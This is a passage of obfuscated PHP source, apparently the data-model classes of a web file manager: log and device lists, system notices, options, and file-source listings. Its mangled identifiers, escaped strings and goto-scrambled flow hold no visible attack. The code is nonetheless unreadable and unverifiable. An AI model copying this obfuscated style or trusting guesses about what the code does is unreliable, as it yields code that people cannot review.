íêî¶£¹[75]]); } catch (Exception $f‘š¡ºÅöİ) { continue; } $F˜ÏÕ«¡¥ò[$a íêî¶£¹[75]] = $A‡›†¥„İè[$a íêî¶£¹[75]]; $b†ÚŞ¨ÜÈ[] = $F˜ÏÕ«¡¥ò[$a íêî¶£¹[390]] = $bÂè¼áéÖ[$a íêî¶£¹[390]]; $b†ÚŞ¨ÜÈ[] = $F˜ÏÕ«¡¥ò[$a íêî¶£¹[1879]] = $bÂè¼áéÖ[$a íêî¶£¹[472]]; break; } return $F˜ÏÕ«¡¥ò; } private function getSourceList(&$aÖ¯ «†Ôø) { $Cùî±Ê‡¸¤ =& $_SERVER[Â€Á›¨õ]; $d¸„«Ã‘Á¡ = array(); foreach ($aÖ¯ «†Ôø as $fŞ„Ù³–¸ => $c—Ñàá„‚î) { goto b¾‘á°ùé˜; EÙµó‹œ: if ($Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[29]] == $Cùî±Ê‡¸¤[1887]) { $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[425]][$Cùî±Ê‡¸¤[390]]; } goto B™£°£ÈŠƒ; BÜõõ©öËë: $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[390]]; $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[1879]]; if ($Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[29]] == $Cùî±Ê‡¸¤[515]) { $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[425]][$Cùî±Ê‡¸¤[1029]]; $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[425]][$Cùî±Ê‡¸¤[1030]]; } goto EÙµó‹œ; b¾‘á°ùé˜: $Ağï»µ¥‹‡ = json_decode($c—Ñàá„‚î[$Cùî±Ê‡¸¤[425]], !0); if ($c—Ñàá„‚î[$Cùî±Ê‡¸¤[29]] == $Cùî±Ê‡¸¤[1635]) { $Ağï»µ¥‹‡ = $this->descZipDownload($Ağï»µ¥‹‡, $d¸„«Ã‘Á¡); $aÖ¯ «†Ôø[$fŞ„Ù³–¸][$Cùî±Ê‡¸¤[425]] = json_encode($Ağï»µ¥‹‡); continue; } if (strpos($c—Ñàá„‚î[$Cùî±Ê‡¸¤[29]], $Cùî±Ê‡¸¤[1880]) !== 0) { if (!isset($Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[75]]) || strpos($c—Ñàá„‚î[$Cùî±Ê‡¸¤[29]], $Cùî±Ê‡¸¤[2063]) !== 0) { continue; } try { $A£–¶­¶èª = IO::infoFull($Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[75]]); } catch (Exception $F†Áùå‰ÒÂ) { continue; } $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[390]] = $A£–¶­¶èª[$Cùî±Ê‡¸¤[390]]; $d¸„«Ã‘Á¡[] = $Ağï»µ¥‹‡[$Cùî±Ê‡¸¤[1879]] = $A£–¶­¶èª[$Cùî±Ê‡¸¤[472]]; $aÖ¯ «†Ôø[$fŞ„Ù³–¸][$Cùî±Ê‡¸¤[425]] = json_encode($Ağï»µ¥‹‡); continue; } goto BÜõõ©öËë; B™£°£ÈŠƒ: } if (!$d¸„«Ã‘Á¡) { return array(); } return Model($Cùî±Ê‡¸¤[767])->sourceListInfo($d¸„«Ã‘Á¡, !0); } private function logList($D¾ËçöÖ«) { goto A²‘÷•£™; Eîë·åì…Ğ: return $F£ß›™Î¢§; goto aÏ–âåÜˆÔ; eµô¥ÇƒÖÀ: $f´¾Òßä±İ = $this->getSourceList($D¾ËçöÖ«); $a—Ğ”ã˜ªË = $this->typeAll(); $F£ß›™Î¢§ = array(); goto E“¼ÃÌ¨ØÛ; A²‘÷•£™: $a»Œà²„­ =& $_SERVER[Â€Á›¨õ]; $cÍ¶Ä©ŞË‚ = array_to_keyvalue($D¾ËçöÖ«, $a»Œà²„­[33], $a»Œà²„­[1501]); $a½Ì†Öğ¹ = Model($a»Œà²„­[501])->userListInfo(array_unique($cÍ¶Ä©ŞË‚)); goto eµô¥ÇƒÖÀ; E“¼ÃÌ¨ØÛ: $e×çĞè«šƒ = array(); foreach ($D¾ËçöÖ« as $e—‹„‡®— => $bğ—ÙÆ˜¤·) { goto CÖ„ìŠ‚´¢; c°Ü ‡ïØ“: $this->ipAddress($bğ—ÙÆ˜¤·); if (strpos($BßæäõÇÛ, $a»Œà²„­[1880]) === 0 || isset($d±çÑÑŠ“É[$a»Œà²„­[1879]])) { goto BîÈƒ´Œçö; Aé˜óë´³: if ($d±çÑÑŠ“É[$a»Œà²„­[1892]] && $d±çÑÑŠ“É[$a»Œà²„­[1892]][$a»Œà²„­[398]] == $a»Œà²„­[1143]) { $e×çĞè«šƒ[] = $bğ—ÙÆ˜¤·[$a»Œà²„­[388]]; unset($D¾ËçöÖ«[$e—‹„‡®—]); continue; } goto CÜÀâĞŠÒ‡; BîÈƒ´Œçö: $d±çÑÑŠ“É[$a»Œà²„­[84]] = $f´¾Òßä±İ[$d±çÑÑŠ“É[$a»Œà²„­[390]]]; $d±çÑÑŠ“É[$a»Œà²„­[1892]] = $f´¾Òßä±İ[$d±çÑÑŠ“É[$a»Œà²„­[1879]]]; if ($d±çÑÑŠ“É[$a»Œà²„­[29]] == $a»Œà²„­[515]) { $d±çÑÑŠ“É[$a»Œà²„­[425]][$a»Œà²„­[1029]] = $f´¾Òßä±İ[$d±çÑÑŠ“É[$a»Œà²„­[425]][$a»Œà²„­[1029]]]; $d±çÑÑŠ“É[$a»Œà²„­[425]][$a»Œà²„­[1030]] = $f´¾Òßä±İ[$d±çÑÑŠ“É[$a»Œà²„­[425]][$a»Œà²„­[1030]]]; } goto a©¼§‡¹æÚ; a©¼§‡¹æÚ: if ($d±çÑÑŠ“É[$a»Œà²„­[29]] == $a»Œà²„­[1887]) { $d±çÑÑŠ“É[$a»Œà²„­[425]][$a»Œà²„­[390]] = $f´¾Òßä±İ[$d±çÑÑŠ“É[$a»Œà²„­[425]][$a»Œà²„­[390]]]; } if ($d±çÑÑŠ“É[$a»Œà²„­[29]] == $a»Œà²„­[1630]) { $d±çÑÑŠ“É[$a»Œà²„­[1892]] = $d±çÑÑŠ“É[$a»Œà²„­[84]]; $d±çÑÑŠ“É[$a»Œà²„­[1879]] = $d±çÑÑŠ“É[$a»Œà²„­[1892]][$a»Œà²„­[390]]; $d±çÑÑŠ“É[$a»Œà²„­[84]] = !1; $d±çÑÑŠ“É[$a»Œà²„­[390]] = $a»Œà²„­[33]; } if ($d±çÑÑŠ“É[$a»Œà²„­[84]] && $d±çÑÑŠ“É[$a»Œà²„­[84]][$a»Œà²„­[398]] == $a»Œà²„­[1143]) { $e×çĞè«šƒ[] = $bğ—ÙÆ˜¤·[$a»Œà²„­[388]]; unset($D¾ËçöÖ«[$e—‹„‡®—]); continue; } goto Aé˜óë´³; CÜÀâĞŠÒ‡: } $bğ—ÙÆ˜¤·[$a»Œà²„­[425]] = $d±çÑÑŠ“É; goto eƒÍ¼òóğ; CÖ„ìŠ‚´¢: $BßæäõÇÛ = $bğ—ÙÆ˜¤·[$a»Œà²„­[29]]; $aĞìîŒÀ¥ = isset($a½Ì†Öğ¹[$bğ—ÙÆ˜¤·[$a»Œà²„­[1501]]]) ? $a½Ì†Öğ¹[$bğ—ÙÆ˜¤·[$a»Œà²„­[1501]]] : !1; $b‹øÍËÈˆŠ = strpos($BßæäõÇÛ, $a»Œà²„­[2064]) === 0 ? LNG($a»Œà²„­[2065]) : LNG($a»Œà²„­[2060]); goto D¶“äŒ£ª; D¶“äŒ£ª: $bğ—ÙÆ˜¤·[$a»Œà²„­[28]] = isset($aĞìîŒÀ¥[$a»Œà²„­[28]]) ? $aĞìîŒÀ¥[$a»Œà²„­[28]] : LNG($a»Œà²„­[2060]); $bğ—ÙÆ˜¤·[$a»Œà²„­[1928]] = isset($aĞìîŒÀ¥[$a»Œà²„­[1928]]) ? $aĞìîŒÀ¥[$a»Œà²„­[1928]] : $a»Œà²„­[33]; $bğ—ÙÆ˜¤·[$a»Œà²„­[1406]] = isset($a—Ğ”ã˜ªË[$BßæäõÇÛ]) ? $a—Ğ”ã˜ªË[$BßæäõÇÛ] : $b‹øÍËÈˆŠ; goto eéø«ß“°Å; eƒÍ¼òóğ: unset($bğ—ÙÆ˜¤·[$a»Œà²„­[2066]]); $F£ß›™Î¢§[] = $bğ—ÙÆ˜¤·; goto cÑ‚¼î ; eéø«ß“°Å: $bğ—ÙÆ˜¤·[$a»Œà²„­[1822]] = $aĞìîŒÀ¥; $d±çÑÑŠ“É = json_decode($bğ—ÙÆ˜¤·[$a»Œà²„­[425]], !0); $bğ—ÙÆ˜¤·[$a»Œà²„­[2059]] = isset($d±çÑÑŠ“É[$a»Œà²„­[2059]]) ? $d±çÑÑŠ“É[$a»Œà²„­[2059]] : $a»Œà²„­[33]; goto c°Ü ‡ïØ“; cÑ‚¼î : } $this->clearSystemPathLog($e×çĞè«šƒ); goto Eîë·åì…Ğ; aÏ–âåÜˆÔ: } private function clearSystemPathLog($EÛ‹¯Á ô) { $Bô¨·†ùË› =& $_SERVER[Â€Á›¨õ]; if (count($EÛ‹¯Á ô) == 0) { return; } $AÁ³éì¸Á¿ = array($Bô¨·†ùË›[388] => array($Bô¨·†ùË›[7], array_unique($EÛ‹¯Á ô))); $this->where($AÁ³éì¸Á¿)->delete(); } public function deviceList($eš½‚æäæ, $A®”ÓåÖÇ = 0) { $F„ñÑ¿¶Ú =& $_SERVER[Â€Á›¨õ]; $a®ŠÃÛÓƒ£ = array($F„ñÑ¿¶Ú[1501] => $eš½‚æäæ, $F„ñÑ¿¶Ú[192] => array($F„ñÑ¿¶Ú[946], $A®”ÓåÖÇ), $F„ñÑ¿¶Ú[29] => $F„ñÑ¿¶Ú[1604]); $aó–¡à´İº = array(); $cŞ…ƒíğ£î = $this->field($F„ñÑ¿¶Ú[2067])->where($a®ŠÃÛÓƒ£)->order($F„ñÑ¿¶Ú[1890])->limit(50)->select(); foreach ($cŞ…ƒíğ£î as $Aõ³ää‡ => $f†·¢ÖËÄà) { goto b„ƒÙ­öº®; C¬öé¢ÀŠÙ: $this->ipAddress($f†·¢ÖËÄà); $f†·¢ÖËÄà[$F„ñÑ¿¶Ú[425]] = $B†šÃñÆ§×; $aó–¡à´İº[$Eì‡…óñ¿ù] = $f†·¢ÖËÄà; goto bâòÖÉƒ‘ª; e¾´ éÓ­: unset($B†šÃñÆ§×[$F„ñÑ¿¶Ú[2059]]); $Eì‡…óñ¿ù = $this->deviceType($B†šÃñÆ§×[$F„ñÑ¿¶Ú[1881]]); if (isset($aó–¡à´İº[$Eì‡…óñ¿ù])) { continue; } goto C¬öé¢ÀŠÙ; b„ƒÙ­öº®: if ($Aõ³ää‡ > 0 && abs($f†·¢ÖËÄà[$F„ñÑ¿¶Ú[192]] - $cŞ…ƒíğ£î[$Aõ³ää‡ - 1][$F„ñÑ¿¶Ú[192]]) < 5) { continue; } $B†šÃñÆ§× = json_decode($f†·¢ÖËÄà[$F„ñÑ¿¶Ú[425]], !0); $f†·¢ÖËÄà[$F„ñÑ¿¶Ú[2059]] = isset($B†šÃñÆ§×[$F„ñÑ¿¶Ú[2059]]) ? $B†šÃñÆ§×[$F„ñÑ¿¶Ú[2059]] : $F„ñÑ¿¶Ú[33]; goto e¾´ éÓ­; bâòÖÉƒ‘ª: } return array_values($aó–¡à´İº); } public function deviceType($F¿Ï“¶Éë·) { return $F¿Ï“¶Éë·; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x6e\x6f\x74\x69\143\145\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x63\157\156\x74\x65\156\164", "\141\x75\x74\x68", "\x6d\x6f\144\x65", "\x74\151\x6d\145", "\164\x79\160\x65", "\154\145\x76\145\x6c", "\145\x6e\x61\142\x6c\x65", "\x73\157\x72\x74"); public function listData($fËœ­Ò¤… = false, $DÏ¦š²ƒóó = "\163\157\x72\x74", $eİ‹´¯¿×§ = false) { return parent::listData($fËœ­Ò¤…, $DÏ¦š²ƒóó, $eİ‹´¯¿×§); } public function add($dÍë’–ÖÙ) { $dˆŸš¥ß‚ =& $_SERVER[Â€Á›¨õ]; $bÕñ©†ŸâÖ = time(); if ($dÍë’–ÖÙ[$dˆŸš¥ß‚[12]] == $dˆŸš¥ß‚[2068]) { $bÕñ©†ŸâÖ = strtotime($dÍë’–ÖÙ[$dˆŸš¥ß‚[195]]); } $dÍë’–ÖÙ[$dˆŸš¥ß‚[195]] = $bÕñ©†ŸâÖ; return parent::insert($dÍë’–ÖÙ); } public function update($B†ŸªÍ©, $D«…ÉõÃ´î) { goto DÓ“àè•ö; DÓ“àè•ö: $dÊ•‡´Àéæ =& $_SERVER[Â€Á›¨õ]; $A±‡”Â½ŠÄ = $this->listData($B†ŸªÍ©); if (!$A±‡”Â½ŠÄ) { return !1; } goto d®ÜŒƒÔŠ¼; d®ÜŒƒÔŠ¼: $DÚ“©ˆÎÒí = time(); if ($D«…ÉõÃ´î[$dÊ•‡´Àéæ[12]] == $dÊ•‡´Àéæ[2068]) { $DÚ“©ˆÎÒí = strtotime($D«…ÉõÃ´î[$dÊ•‡´Àéæ[195]]); } $D«…ÉõÃ´î[$dÊ•‡´Àéæ[195]] = $DÚ“©ˆÎÒí; goto aö¢ôİâ„³; aö¢ôİâ„³: return parent::update($B†ŸªÍ©, $D«…ÉõÃ´î); goto F§ø…Øí¾Ò; F§ø…Øí¾Ò: } public function remove($fîãƒ™í³Ì) { $bÉ¥½Š’Œ… = $this->listData($fîãƒ™í³Ì); if (!$bÉ¥½Š’Œ… || $bÉ¥½Š’Œ…[$_SERVER[Â€Á›¨õ][1143]]) { return !1; } return parent::remove($fîãƒ™í³Ì); } public function sort($DÀçÄÚÂ¨, $C‰²ˆ¿Èá) { return parent::update($DÀçÄÚÂ¨, $C‰²ˆ¿Èá); } public function enable($C­‘ãŒ©Å¾, $B¬ô˜àœ·¬) { return parent::update($C­‘ãŒ©Å¾, array($_SERVER[Â€Á›¨õ][2069] => $B¬ô˜àœ·¬)); } private function initUserOption() { $d°æ×å¬‘Ö =& $_SERVER[Â€Á›¨õ]; $this->optionType = $d°æ×å¬‘Ö[2070]; $this->modelType = $d°æ×å¬‘Ö[2071]; $this->field = array($d°æ×å¬‘Ö[2072], $d°æ×å¬‘Ö[28], $d°æ×å¬‘Ö[195], $d°æ×å¬‘Ö[29], $d°æ×å¬‘Ö[2073], $d°æ×å¬‘Ö[702], $d°æ×å¬‘Ö[189]); } public function userNoticeGet($eÌÊ¼Ø®„¦ = false) { $this->initUserOption(); return parent::listData($eÌÊ¼Ø®„¦, $_SERVER[Â€Á›¨õ][388], !0); } public function userNoticeAdd($d†É½–¹‹¸) { $b­†§¸ß‡ =& $_SERVER[Â€Á›¨õ]; $this->initUserOption(); $bÙÔ¬İÕƒ = $this->findByKey($b­†§¸ß‡[2072], $d†É½–¹‹¸[$b­†§¸ß‡[388]]); if ($bÙÔ¬İÕƒ) { return !0; } $DğƒÀ ’„ = array($b­†§¸ß‡[2072] => $d†É½–¹‹¸[$b­†§¸ß‡[388]], $b­†§¸ß‡[28] => $d†É½–¹‹¸[$b­†§¸ß‡[28]], $b­†§¸ß‡[195] => $d†É½–¹‹¸[$b­†§¸ß‡[195]], $b­†§¸ß‡[29] => isset($d†É½–¹‹¸[$b­†§¸ß‡[29]]) ? $d†É½–¹‹¸[$b­†§¸ß‡[29]] : 1, $b­†§¸ß‡[2073] => isset($d†É½–¹‹¸[$b­†§¸ß‡[2073]]) ? $d†É½–¹‹¸[$b­†§¸ß‡[2073]] : 0, $b­†§¸ß‡[702] => 0, $b­†§¸ß‡[189] => 0); return parent::insert($DğƒÀ ’„); } public function userNoticeEdit($E±Ö™“ÆÚ , $BÚØÖÂô‚±) { $this->initUserOption(); return parent::update($E±Ö™“ÆÚ , $BÚØÖÂô‚±); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\x6d\137\157\160\164\x69\157\156"; protected $jsonField = array("\155\x65\156\x75", "\x72\x6f\154\145", "\162\157\x6c\145\107\x72\x6f\x75\160", "\162\x65\147\151\163\x74", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Aº•²ƒ‰š) { return "\x53\171\x73\164\x65\155\117\160\x74\x69\157\x6e\x5f{$Aº•²ƒ‰š}"; } protected function optionDefault($A¾æÁ¸¡‡ = '') { $D¼áœĞÈØÕ =& $_SERVER[Â€Á›¨õ]; if ($A¾æÁ¸¡‡ == $D¼áœĞÈØÕ[33]) { return $GLOBALS[$D¼áœĞÈØÕ[6]][$D¼áœĞÈØÕ[376]]; } } } goto a‚Å’; aØ›‚½š: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\145"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\x6d\145" => "\151\x6f\x5f\x73\x6f\165\162\x63\145\137\x6d\x65\164\141", "\155\x65\x74\141\106\151\145\154\x64" => "\163\157\165\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\151\155\x65", "\164\x69\x6d\x65", "\151\156\x73\145\162\x74", "\x66\165\156\x63\x74\x69\x6f\156"), array("\143\162\145\x61\x74\x65\124\x69\155\145", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\151\x6f\x6e"), array("\x76\151\x65\167\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($d¢ÊİÜ‹¹) { return $this->listSource(array($_SERVER[Â€Á›¨õ][389] => $d¢ÊİÜ‹¹)); } public function typeName($EÍ†äø´) { static $DŠâµÅ×·é = array(self::TYPE_SYSTEM => "\x73\171\163\x74\x65\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $DŠâµÅ×·é[$EÍ†äø´ . $_SERVER[Â€Á›¨õ][33]]; } public function sourceListInfo($aï¼•Ÿøğ, $A¯“Ô™¹¼— = false) { goto A¿À½ñ“Ù; A¿À½ñ“Ù: $f¨Š¡¸í‚¾ =& $_SERVER[Â€Á›¨õ]; $aï¼•Ÿøğ = $aï¼•Ÿøğ ? $aï¼•Ÿøğ : array(); $aï¼•Ÿøğ = array_filter(array_unique($aï¼•Ÿøğ)); goto e÷ñŞ•àÔÛ; e÷ñŞ•àÔÛ: if (!$aï¼•Ÿøğ) { return array(); } $A ŠÊé½½¸ = $this->where(array($f¨Š¡¸í‚¾[390] => array($f¨Š¡¸í‚¾[7], $aï¼•Ÿøğ)))->select(); $this->_listDataApply($A ŠÊé½½¸, $A¯“Ô™¹¼—); goto bÛôğáÔ¿; bÛôğáÔ¿: return array_to_keyvalue($A ŠÊé½½¸, $f¨Š¡¸í‚¾[390]); goto d¿§†Ä¬†×; d¿§†Ä¬†×: } public function pathInfoFilter(&$E—ÉĞ‹ƒ‘´) { goto fì­¼ŒªÖÍ; DÖ±‡°ÖŠ«: if (!$dÅ¡ŞØÈŸÇ) { goto c¬÷ªòéÇÆ; c¬÷ªòéÇÆ: $FÄè¸£ŠŠ† = $D£ÓÖÛ¢‡Ä[391]; $FÄè¸£ŠŠ† .= $D£ÓÖÛ¢‡Ä[392]; $FÄè¸£ŠŠ† .= $D£ÓÖÛ¢‡Ä[393]; goto D³³¥­Û; AİËİÇ Úµ: $b†¤ÒÂˆù“ = array(); foreach ($dÅ¡ŞØÈŸÇ as $b†Ñ‘£Ì‰) { if (in_array($b†Ñ‘£Ì‰, $a‡åÇ‚âˆŸ)) { continue; } $b†¤ÒÂˆù“[] = $b†Ñ‘£Ì‰; } goto c­ºÄ…¤Ê§; D³³¥­Û: $E›Ê…ìÉ¼˜ = $D£ÓÖÛ¢‡Ä[394]; $a‡åÇ‚âˆŸ = explode($D£ÓÖÛ¢‡Ä[47], $E›Ê…ìÉ¼˜); $dÅ¡ŞØÈŸÇ = explode($D£ÓÖÛ¢‡Ä[47], $FÄè¸£ŠŠ†); goto AİËİÇ Úµ; c­ºÄ…¤Ê§: } $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[75]] = $D£ÓÖÛ¢‡Ä[395] . $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[390]] . $D£ÓÖÛ¢‡Ä[396]; $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[29]] = $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[397]] == 1 ? $D£ÓÖÛ¢‡Ä[76] : $D£ÓÖÛ¢‡Ä[173]; goto AŠ‚ŒªÀ«è; fì­¼ŒªÖÍ: $D£ÓÖÛ¢‡Ä =& $_SERVER[Â€Á›¨õ]; static $dÅ¡ŞØÈŸÇ = false; static $b†¤ÒÂˆù“ = false; goto DÖ±‡°ÖŠ«; AŠ‚ŒªÀ«è: $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[398]] = $this->typeName($E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[398]]); if ($E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[397]] != 1) { $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[167]] = $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[399]]; unset($E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[399]]); } $CŒ†÷åøŸì = $dÅ¡ŞØÈŸÇ; goto c²“ó©æï“; c²“ó©æï“: if (isset($E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[400]]) && $E—ÉĞ‹ƒ‘´[$D£ÓÖÛ¢‡Ä[400]][$D£ÓÖÛ¢‡Ä[401]] == -1) { $CŒ†÷åøŸì = $b†¤ÒÂˆù“; } $E—ÉĞ‹ƒ‘´ = array_field_key($E—ÉĞ‹ƒ‘´, $CŒ†÷åøŸì); return $E—ÉĞ‹ƒ‘´; goto dªëåÔÁ¯‚; dªëåÔÁ¯‚: } public function listUserFav() { goto eìÊ¾¯±ŒË; eŸÀÇğíæÙ: foreach ($bãåÍ¨¥ as &$e´±àìÂì¨) { $e´±àìÂì¨ = array($cÔà½‡‹‘“[406] => $e´±àìÂì¨[$cÔà½‡‹‘“[388]], $cÔà½‡‹‘“[407] => $e´±àìÂì¨[$cÔà½‡‹‘“[28]], $cÔà½‡‹‘“[408] => $e´±àìÂì¨[$cÔà½‡‹‘“[75]], $cÔà½‡‹‘“[409] => $e´±àìÂì¨[$cÔà½‡‹‘“[29]], $cÔà½‡‹‘“[410] => $e´±àìÂì¨[$cÔà½‡‹‘“[192]], $cÔà½‡‹‘“[411] => $e´±àìÂì¨[$cÔà½‡‹‘“[83]]); if ($e´±àìÂì¨[$cÔà½‡‹‘“[29]] == $cÔà½‡‹‘“[403] && $Aò˜‘²ºê®[$e´±àìÂì¨[$cÔà½‡‹‘“[75]]]) { $e´±àìÂì¨[$cÔà½‡‹‘“[84]] = $Aò˜‘²ºê®[$e´±àìÂì¨[$cÔà½‡‹‘“[75]]]; } } unset($e´±àìÂì¨); return $bãåÍ¨¥; goto c¡¶¥×ËğÛ; eÇ²áØ²Áã: $EÍé»ÄÄØ¼ = array_to_keyvalue($EÍé»ÄÄØ¼, $cÔà½‡‹‘“[33], $cÔà½‡‹‘“[75]); if ($EÍé»ÄÄØ¼) { $Aò˜‘²ºê® = $this->listSource(array($cÔà½‡‹‘“[404] => array($cÔà½‡‹‘“[405], $EÍé»ÄÄØ¼))); } $Aò˜‘²ºê® = array_to_keyvalue($Aò˜‘²ºê®[$cÔà½‡‹‘“[365]], $cÔà½‡‹‘“[390]); goto eŸÀÇğíæÙ; eìÊ¾¯±ŒË: $cÔà½‡‹‘“ =& $_SERVER[Â€Á›¨õ]; $bãåÍ¨¥ = Model($cÔà½‡‹‘“[402])->listData(); $EÍé»ÄÄØ¼ = array_filter_by_field($bãåÍ¨¥, $cÔà½‡‹‘“[29], $cÔà½‡‹‘“[403]); goto eÇ²áØ²Áã; c¡¶¥×ËğÛ: } public function listUserTag($Dù´‰Á›Ç) { goto CÎÜ’ÍãÏÖ; fîâ±‘‘…: if (!$b°ä„ˆËéˆ || count($b‡›Ï’°ô…) == $b°ä„ˆËéˆ[$aÁ¶°»…²[362]][$aÁ¶°»…²[363]]) { return $b°ä„ˆËéˆ; } $Bíİ¹…†± = array(); $f˜¤¢Şöí‚ = array_to_keyvalue($b°ä„ˆËéˆ[$aÁ¶°»…²[74]], $aÁ¶°»…²[33], $aÁ¶°»…²[390]); goto e×¦òí¾§; bæ•´ğïí: foreach ($aÈÎÑ³Êö± as $Cö…ø›šæ => $a¿È¦šà‘·) { $CÈ¿ãœŒˆª = !0; if (!$Dù´‰Á›Ç) { $b‡›Ï’°ô…[] = $Cö…ø›šæ; continue; } foreach ($Dù´‰Á›Ç as $c™³Ú¹Ê»‹) { if (!in_array($c™³Ú¹Ê»‹, $a¿È¦šà‘·)) { $CÈ¿ãœŒˆª = !1; break; } } if ($CÈ¿ãœŒˆª) { $b‡›Ï’°ô…[] = $Cö…ø›šæ; } } if (!$b‡›Ï’°ô…) { return array(); } $b°ä„ˆËéˆ = $this->listSource(array($aÁ¶°»…²[404] => array($aÁ¶°»…²[405], $b‡›Ï’°ô…))); goto fîâ±‘‘…; e×¦òí¾§: $a´ïÔ–¬÷Ò = array_to_keyvalue($b°ä„ˆËéˆ[$aÁ¶°»…²[73]], $aÁ¶°»…²[33], $aÁ¶°»…²[390]); $Fªò•¬ì« = array_merge($a´ïÔ–¬÷Ò, $f˜¤¢Şöí‚); foreach ($b‡›Ï’°ô… as $BÆ÷©Á¼¬˜) { if (!in_array($BÆ÷©Á¼¬˜, $Fªò•¬ì«)) { $Bíİ¹…†±[] = $BÆ÷©Á¼¬˜; } } goto Bîà®Ïéó; cÈœù»’œª: $aÈÎÑ³Êö± = array(); foreach ($fÇŒï¸µ’ as $cË¿ï„§Û¥) { $BÆ÷©Á¼¬˜ = $cË¿ï„§Û¥[$aÁ¶°»…²[75]]; if (!$BÆ÷©Á¼¬˜) { continue; } if (!isset($aÈÎÑ³Êö±[$BÆ÷©Á¼¬˜])) { $aÈÎÑ³Êö±[$BÆ÷©Á¼¬˜] = array(); } $aÈÎÑ³Êö±[$BÆ÷©Á¼¬˜][] = $cË¿ï„§Û¥[$aÁ¶°»…²[413]]; } $b‡›Ï’°ô… = array(); goto bæ•´ğïí; CÎÜ’ÍãÏÖ: $aÁ¶°»…² =& $_SERVER[Â€Á›¨õ]; if ($Dù´‰Á›Ç && !is_array($Dù´‰Á›Ç)) { $Dù´‰Á›Ç = array($Dù´‰Á›Ç); } $fÇŒï¸µ’ = Model($aÁ¶°»…²[412])->listData(); goto cÈœù»’œª; Bîà®Ïéó: if ($Bíİ¹…†±) { Model($aÁ¶°»…²[414])->removeBySource($Bíİ¹…†±); } return $b°ä„ˆËéˆ; goto C¦œæ½ÄÊ£; C¦œæ½ÄÊ£: } public function listUserRecycle() { $CÇ‰ç¹ÎÆè =& $_SERVER[Â€Á›¨õ]; $EÇ£ØŞ­ñ² = Model($CÇ‰ç¹ÎÆè[415])->listData(); if (!$EÇ£ØŞ­ñ²) { return array(); } $dÑç¨È÷ = array($CÇ‰ç¹ÎÆè[404] => array($CÇ‰ç¹ÎÆè[405], $EÇ£ØŞ­ñ²), $CÇ‰ç¹ÎÆè[416] => 1); return $this->listSource($dÑç¨È÷); } public function listSource($CÚÛÈÓ­ô©, $FøŒ«ä¼—ë = 3000) { goto AÃò¼Ï»¹à; C¬´¸®ì: $CàĞ¦ìÖ°· = $this->field($bÖŸêŒÍ·ß)->_makeOrder()->where($CÚÛÈÓ­ô©)->selectPage($FøŒ«ä¼—ë); $this->_listDataApply($CàĞ¦ìÖ°·[$FË¨ßÅ„…¶[365]]); $this->_listMake($CàĞ¦ìÖ°·); goto c­“ÒİĞö; AÃò¼Ï»¹à: $FË¨ßÅ„…¶ =& $_SERVER[Â€Á›¨õ]; if (!isset($CÚÛÈÓ­ô©[$FË¨ßÅ„…¶[417]])) { $CÚÛÈÓ­ô©[$FË¨ßÅ„…¶[417]] = 0; } $bÖŸêŒÍ·ß = $FË¨ßÅ„…¶[418]; goto C¬´¸®ì; c­“ÒİĞö: return $CàĞ¦ìÖ°·; goto eë±èä—ºÍ; eë±èä—ºÍ: } protected function _makeOrder() { goto fÒÏ”“·‹; e‹‰ˆØì¡: $eù¬Å×É«È = array($C…ÑÜ“”Õˆ[422] => $C…ÑÜ“”Õˆ[423], $C…ÑÜ“”Õˆ[424] => $C…ÑÜ“”Õˆ[425]); $BÍäÂ§š£ = array($C…ÑÜ“”Õˆ[28] => $C…ÑÜ“”Õˆ[28], $C…ÑÜ“”Õˆ[77] => $C…ÑÜ“”Õˆ[77], $C…ÑÜ“”Õˆ[167] => $C…ÑÜ“”Õˆ[399], $C…ÑÜ“”Õˆ[426] => $C…ÑÜ“”Õˆ[426], $C…ÑÜ“”Õˆ[427] => $C…ÑÜ“”Õˆ[428], $C…ÑÜ“”Õˆ[192] => $C…ÑÜ“”Õˆ[192], $C…ÑÜ“”Õˆ[83] => $C…ÑÜ“”Õˆ[83]); $bİâ‘Ã Ï = 